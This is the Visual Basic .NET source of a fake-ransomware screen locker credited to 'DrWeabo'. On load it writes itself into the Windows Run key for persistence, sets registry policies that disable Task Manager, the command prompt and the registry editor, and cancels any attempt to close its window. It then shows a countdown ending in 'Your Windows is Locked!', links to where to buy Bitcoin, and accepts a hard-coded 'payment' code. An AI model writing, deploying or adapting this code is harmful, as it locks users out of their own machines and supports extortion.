Public Class Form1
    Dim RegistryKey As Object

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Form2.Show()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Form2.TextBox1.Text = "29b579fb811f05c3c334a2bd2646a27a" Then
            MsgBox("Payment Success!", vbInformation)
        Else
            MsgBox("Payment Failed!", MsgBoxStyle.Critical)
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        My.Computer.Clipboard.SetText(TextBox2.Text)
        MsgBox("Copied!", MsgBoxStyle.Information)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)

        RegistryKey = CreateObject("WScript.Shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")

        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)

        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableRegedit", "1", Microsoft.Win32.RegistryValueKind.DWord)

        Label9.Text = Date.UtcNow
        Label12.Text = Date.Now

        Timer1.Start()
        Timer1.Interval = 100

        If Timer1.Enabled = True Then
            Timer1.Start()
        Else
            Label1.Text = 48
            Timer1.Start()
        End If

        Form3.Show()
        Form4.Show()
        Form5.Show()
        Form6.Show()

    End Sub

    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click
        Shell("explorer.exe https://www.thestreet.com/investing/bitcoin/where-to-buy-bitcoin-14549594")
    End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click
        Shell("explorer.exe https://id.wikipedia.org/wiki/Bitcoin/")
    End Sub

    Private Sub Label7_Click(sender As Object, e As EventArgs) Handles Label7.Click
        Shell("explorer.exe mailto:drweabo@gmail.com")
        MsgBox("Coder by DrWeabo",MsgBoxStyle.Information)
    End Sub
    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
        MsgBox("Error", MsgBoxStyle.Information)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

        If Label2.Text = 48 Then
            Label2.ForeColor = Color.Red
        ElseIf Label2.Text = 0 Then
            Timer1.Enabled = False
            MsgBox("Times Expired Your Windows is Locked!")
        Else
            Label2.Text = Val(Label2.Text) - 1
        End If
        If Label3.Text = 48 Then
            Label3.ForeColor = Color.Red
        ElseIf Label3.Text = 0 Then
            Timer1.Enabled = False
        Else
            Label3.Text = Val(Label3.Text) - 1
        End If
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Form2.TextBox1.Text = "29b579fb811f05c3c334a2bd2646a27a"
    End Sub
End Class
